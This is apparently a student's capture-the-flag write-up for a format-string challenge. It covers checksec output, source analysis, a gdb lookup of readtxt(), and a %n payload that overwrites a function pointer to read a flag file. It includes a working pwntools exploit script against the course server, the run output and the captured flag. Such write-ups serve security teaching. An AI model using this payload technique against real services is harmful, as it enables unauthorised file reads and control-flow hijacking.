# Format Strings: CTF #6

## Checksec

```
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
Debuginfo:  Yes
```

From the checksec output, we can exploit the stack being executable and writeable.

## Source code analysis

- The file `rules.txt` is read when called by `readtxt()`.
- All auxiliary functions are called via the function pointer `fun`.
  By modifying `fun` to the address of `readtxt()` and pointing the first argument to a user provided string, it is possible to read the contents of any file inside the server.
- There is a format string vulnerability in the `printf()` call at line 33, because no arguments are provided to the format string, so it will use the next value in the stack as the argument, which we have control of.

## Objective

Modify the function pointer `fun` to the address of `readtxt()` and point the first argument to the string `flag` using the format string vulnerability inside the `printf()` call at line 33, so that in line 35 the flag is printed instead of our input.

## Vulnerability exploration

- For this exploit, it is necessary to know the address of the `readtxt()` function, which is `0x80497a5` according to the output of `gdb`:

  ```bash
  $ gdb program
  [...]
  gdb-peda$ p readtxt
  $1 = {int (char *)} 0x80497a5 <readtxt>
  ```

Having this in mind, here is how the payload and the exploit script are built:

- `./flag` as an argument to the `readtxt()` function.
  Note that 6 bytes are needed to redirect to a valid file in the `cat` command; using just `flag` would be trickier because the rest of the payload would interfere with the file name.
- `\x01\x01` to align the payload as 8 bytes chunks; the content itself is irrelevant.
- `fun` as the encoded address of the `readtxt()` function.
  These 4 bytes are asked to be submitted in the script, but encoded. For example, if the `fun` address is `0xffa5e670`, do:
  1. Convert the address to little-endian: `0x70, 0xe6, 0xa5, 0xff`.
  2. Convert the bytes to their ASCII representation: `pæ¥ÿ`.
     A (Hex to ASCII converter)[https://www.rapidtables.com/convert/number/hex-to-ascii.html] is perfect for this.
  3. Paste the string in the stdin.
- `%4x` and `%134518673x` to move the stack pointer to the `fun` portion of the payload and to print the correct number of characters for the `n` specifier.
- `%n` to write the address of `readtxt()` to the `fun` pointer.

The exploit script is as follows:

```python
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4005)
#r = process('./program')
context(arch='i386')

res = r.recvuntil(b"flag:\n")
print(res)

# Payload ============================================
fun = input("Fun pointer: ")
s = "./flag\x01\x01" + fun + "%4x" + "%134518673x" + "%n"
print(s)
payload = (s).encode('latin-1')
# ====================================================

r.sendline(payload)
buf = r.recvall().decode(errors="backslashreplace")
print(buf)
```

Executing the script, results in obtaining the flag as follows:

```bash
$ python3 exploit.py
[/.......] Opening connection to ctf-fsi.fe.up.pt on port 4005: Trying
[+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
b'Read the rules.\nRunning command cat rules.txt\nI will give you an hint: ffa5e670\nTry to unlock the flag:\n'
Fun pointer: pæ¥ÿ
./flag\x01\x01pæ¥ÿ%4x%134518673x%n
[+] Receiving all data: Done (128.29MB)
[*] Closed connection to ctf-fsi.fe.up.pt port 4005
[...]
flag{L34k1ng_Fl4g_0ff_Th3_St4ck_44789C2D}
[...]
1016761Calling function at 80497a5 134518693
Running command cat ./flag.txt
```
